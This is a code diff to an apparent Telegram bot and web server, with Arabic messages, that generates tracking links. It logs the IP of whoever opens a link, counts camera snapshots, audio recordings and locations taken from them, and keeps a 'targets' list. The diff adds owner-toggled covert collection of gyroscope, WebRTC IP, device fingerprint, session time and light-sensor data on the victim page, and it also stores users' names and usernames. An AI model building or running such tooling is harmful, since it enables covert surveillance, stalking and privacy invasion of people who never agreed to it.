@@ -15,14 +15,20 @@ const SETTINGS_FILE   = "./settings.json";
 const TARGETS_FILE    = "./targets.json";
 const NOTES_FILE      = "./notes.json";
 const USERSTATS_FILE  = "./userstats.json";
+const PROFILES_FILE   = "./profiles.json";
+
+const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true };
 
 let users      = new Set(loadJSON(USERS_FILE, []));
 let banned     = new Set(loadJSON(BANNED_FILE, []));
 let targets    = new Set(loadJSON(TARGETS_FILE, []));
 let stats      = { linksOpened:0, linksCreated:0, camsnaps:0, audios:0, locations:0, ...loadJSON(STATS_FILE,{}) };
-let settings   = { welcomeMsg:"", silentMode:false, scheduleHour:-1, awayMode:false, awayMsg:"", ...loadJSON(SETTINGS_FILE,{}) };
-let notes      = loadJSON(NOTES_FILE, {});      // { "userId": ["note1","note2"] }
-let userStats  = loadJSON(USERSTATS_FILE, {});  // { "userId": { linksCreated:0, linksOpened:0 } }
+let settings   = { welcomeMsg:"", silentMode:false, scheduleHour:-1, awayMode:false, awayMsg:"", features:{...DEFAULT_FEATURES}, featureExpiry:null, ...loadJSON(SETTINGS_FILE,{}) };
+let notes      = loadJSON(NOTES_FILE, {});
+let userStats  = loadJSON(USERSTATS_FILE, {});
+let profiles   = loadJSON(PROFILES_FILE, {});  // { "userId": { name, username, seen } }
+
+if (!settings.features) settings.features = {...DEFAULT_FEATURES};
 
 function saveUsers()     { saveJSON(USERS_FILE,     [...users]); }
 function saveBanned()    { saveJSON(BANNED_FILE,    [...banned]); }
@@ -31,6 +37,17 @@ function saveStats()     { saveJSON(STATS_FILE,     stats); }
 function saveSettings()  { saveJSON(SETTINGS_FILE,  settings); }
 function saveNotes()     { saveJSON(NOTES_FILE,     notes); }
 function saveUserStats() { saveJSON(USERSTATS_FILE, userStats); }
+function saveProfiles()  { saveJSON(PROFILES_FILE,  profiles); }
+
+// Auto-disable features when timer expires
+setInterval(() => {
+  if (settings.featureExpiry && Date.now() > settings.featureExpiry) {
+    settings.featureExpiry = null;
+    settings.features = Object.fromEntries(Object.keys(settings.features).map(k=>[k,false]));
+    saveSettings();
+    bot.sendMessage(BOT_OWNER, "⏱️ انتهى وقت الميزات — تم إيقافها تلقائياً.").catch(()=>{});
+  }
+}, 30000);
 
 function incUserStat(uid, field) {
   if (!userStats[uid]) userStats[uid] = { linksCreated:0, linksOpened:0 };
@@ -138,7 +155,8 @@ async function handleLinkOpen(req, res, view) {
     if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `🔍 IP (ID: ${creatorId}):\n⚓ ${ip}\n${info}`);
   });
 
-  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt });
+  const feat = settings.features || DEFAULT_FEATURES;
+  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat });
 }
 
 app.get("/w/:path/:uri",  (req, res) => handleLinkOpen(req, res, "webview"));
@@ -176,6 +194,14 @@ bot.on('message', async (msg) => {
 
   users.add(chatId);
   saveUsers();
+  // Save user profile (name + username)
+  const pid = String(chatId);
+  profiles[pid] = {
+    name: [msg.chat.first_name, msg.chat.last_name].filter(Boolean).join(" ") || "مجهول",
+    username: msg.chat.username ? `@${msg.chat.username}` : "",
+    seen: new Date().toJSON().slice(0,19).replace('T',' ')
+  };
+  saveProfiles();
 
   // ── Away mode: auto-reply for owner ────────────────────────────────────
   if (chatId !== BOT_OWNER && msg.text && !msg.text.startsWith("/") && settings.awayMode && settings.awayMsg) {
@@ -316,12 +342,16 @@ bot.on('message', async (msg) => {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
     const id = parseInt(msg.text.replace("/info","").trim());
     if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ استخدم: /info [ID]");
-    const us = userStats[String(id)] || { linksCreated:0, linksOpened:0 };
+    const us  = userStats[String(id)] || { linksCreated:0, linksOpened:0 };
+    const pro = profiles[String(id)] || {};
     const userNotes = (notes[String(id)] || []);
     const notesText = userNotes.length ? userNotes.map((n,i)=>`${i+1}. ${n}`).join("\n") : "لا توجد";
     return bot.sendMessage(chatId,
-      `👤 معلومات المستخدم: \`${id}\`\n\n` +
-      `📋 في القائمة: ${users.has(id) ? '✅' : '❌'}\n` +
+      `👤 معلومات المستخدم: \`${id}\`\n` +
+      (pro.name     ? `📛 الاسم: ${pro.name}\n` : '') +
+      (pro.username ? `🔗 يوزر: ${pro.username}\n` : '') +
+      (pro.seen     ? `🕐 آخر ظهور: ${pro.seen} UTC\n` : '') +
+      `\n📋 في القائمة: ${users.has(id) ? '✅' : '❌'}\n` +
       `🎯 هدف: ${targets.has(id) ? '✅' : '❌'}\n` +
       `🚫 محجوب: ${banned.has(id) ? '✅' : '❌'}\n\n` +
       `🔗 روابط أنشأها: ${us.linksCreated}\n` +
@@ -433,6 +463,56 @@ bot.on('message', async (msg) => {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
     settings.welcomeMsg=""; saveSettings();
     return bot.sendMessage(chatId,"✅ تمت الإعادة للافتراضي.");
+  }
+
+  // ── Feature control ───────────────────────────────────────────────────────
+  const FEAT_NAMES = { gyroscope:"🌀 جيروسكوب", webrtc:"🌐 WebRTC IP", fingerprint:"🖥️ بصمة الجهاز", sessionTime:"⏱️ وقت الجلسة", lightSensor:"💡 مستشعر الضوء" };
+
+  if (msg.text === "/features") {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const expiry = settings.featureExpiry ? `\n⏱️ تنتهي في: ${new Date(settings.featureExpiry).toJSON().slice(0,19).replace('T',' ')} UTC` : "";
+    const list = Object.entries(settings.features).map(([k,v]) =>
+      `${v ? '🟢' : '🔴'} ${FEAT_NAMES[k]||k} — /feature ${k} ${v?'off':'on'}`
+    ).join("\n");
+    return bot.sendMessage(chatId, `🎛️ الميزات الإضافية:${expiry}\n\n${list}\n\n/fallon — تشغيل الكل\n/falloff — إيقاف الكل\n/ftimer [دقائق] — تشغيل لمدة محددة`);
+  }
+
+  if (msg.text?.startsWith("/feature ")) {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const parts = msg.text.replace("/feature ","").trim().split(" ");
+    const fname = parts[0], fval = parts[1];
+    if (!fname || !fval) return bot.sendMessage(chatId, "⚠️ /feature [اسم] [on/off]");
+    if (!(fname in settings.features)) return bot.sendMessage(chatId, `⚠️ ميزة غير موجودة.\nالميزات: ${Object.keys(settings.features).join(", ")}`);
+    settings.features[fname] = (fval === "on"); saveSettings();
+    return bot.sendMessage(chatId, `${settings.features[fname]?'🟢':'🔴'} ${FEAT_NAMES[fname]||fname}: ${settings.features[fname]?'مفعّلة':'معطّلة'}`);
+  }
+
+  if (msg.text === "/fallon") {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    Object.keys(settings.features).forEach(k => settings.features[k]=true); saveSettings();
+    return bot.sendMessage(chatId, "🟢 تم تفعيل جميع الميزات.");
+  }
+
+  if (msg.text === "/falloff") {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    Object.keys(settings.features).forEach(k => settings.features[k]=false); settings.featureExpiry=null; saveSettings();
+    return bot.sendMessage(chatId, "🔴 تم إيقاف جميع الميزات.");
+  }
+
+  if (msg.text?.startsWith("/ftimer ")) {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const mins = parseInt(msg.text.replace("/ftimer ","").trim());
+    if (isNaN(mins)||mins<1) return bot.sendMessage(chatId, "⚠️ /ftimer [دقائق]");
+    Object.keys(settings.features).forEach(k => settings.features[k]=true);
+    settings.featureExpiry = Date.now() + mins*60*1000; saveSettings();
+    const until = new Date(settings.featureExpiry).toJSON().slice(0,19).replace('T',' ');
+    return bot.sendMessage(chatId, `⏱️ تم تفعيل جميع الميزات لمدة ${mins} دقيقة\n🕐 تنتهي في: ${until} UTC`);
+  }
+
+  if (msg.text === "/ftimeroff") {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    settings.featureExpiry = null; saveSettings();
+    return bot.sendMessage(chatId, "✅ تم إلغاء مؤقت الميزات.");
   }
 
   if (msg.text === "/mystats") {
